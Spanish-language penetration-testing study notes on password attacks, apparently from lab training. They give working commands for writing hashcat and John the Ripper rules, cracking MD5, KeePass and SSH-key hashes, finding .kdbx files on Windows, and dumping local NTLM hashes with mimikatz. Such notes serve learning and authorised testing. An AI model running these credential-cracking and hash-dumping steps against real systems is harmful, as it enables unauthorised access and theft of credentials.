
## Password attacks

  Crear una regla para hashcat que añada '1@3$5' al final de cada contraseña:

    └─# cat demo.rule
    $1 $@ $3 $$ $5

  Utilizamos la regla para crackear el hash MD5:

    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r demo.rule

  Crear una regla para convertir todo a mayúsculas con 'u' y duplicar cada palabara 'd':

    └─# cat demo2.rules 
    u d

  Ejecutamos el ataque:

    └─# hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt -r demo2.rules

  Conseguimos la contraseña:

    19adc0e8921336d08502c039dc297ff8:<REDACTED>

  Reglas de contraseñas:

    https://hashcat.net/wiki/doku.php?id=rule_based_attack

### Keepass

  Buscamos por archivos de Keepass:

    Get-ChildItem -Path C: -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

  Nos transferimos el archivo a nuestro local y sacamos el hash con keepass2john:

    └─# keepass2john Database.kdbx > keepass.hash

  Lanzamos hashcat con la regla /rockyou-30000.rule para crackear la contraseña:

    └─# hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

### id_rsa

  Para sacar el hash de una clave privada id_rsa:

    ssh2john id_rsa > ssh.hash

  Para pasar las reglas a JTR, tenemos que modificar el archivo custom.rule:

    └─# cat custom.rule 
    [List.Rules:sshRules]
    c $1 $3 $7 $@
    c $1 $3 $7 $$
    c $1 $3 $7 $#

  Y corremos JTR:

    └─# john --wordlist=ssh.passwords --rules=sshRules ssh_hash

### NTLM

  Si tenemos privilegios de Administador en una máquina Windows, ejecutamos el comando para ver otros usuarios en el sistema a través de PowerShell:

    Get-LocalUser

  Una vez localicemos los nuevos usuarios, corremos mimikatz y ejecutamos:

    privilege::debug

  Con este comando activamos el permiso 'SeDebugPrivilege' que es necesario para este ataque. Después, lanzamos:

    token::elevate

  Para elevar privilegios a SISTEMA.

  Finalmente, para obtener los hashes:

    lsadump::sam
